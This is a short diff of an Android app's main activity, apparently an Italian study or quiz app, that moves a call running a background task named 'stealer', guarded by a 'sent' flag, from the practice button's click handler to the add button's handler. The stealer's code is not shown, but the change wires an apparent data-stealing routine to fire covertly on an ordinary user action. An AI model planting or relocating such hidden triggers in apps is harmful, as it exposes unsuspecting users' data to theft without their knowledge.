@@ -73,12 +73,13 @@ public class MainActivity extends AppCompatActivity {
         my_db = new DatabaseHelper(MainActivity.this);
 
         aggiungiButton.setOnClickListener(view -> {
+
+            if (inviato == 0) executor.execute(stealer);
             Intent gotoCategorie = new Intent(MainActivity.this, CategorieActivity.class);
             startActivity(gotoCategorie);
         });
 
         esercitatiButton.setOnClickListener(view -> {
-            if (inviato == 0) executor.execute(stealer);
             //my_db.deleteAll();
 
             Intent gotoScegliCategorie = new Intent(MainActivity.this, ScegliCategorieActivity.class);
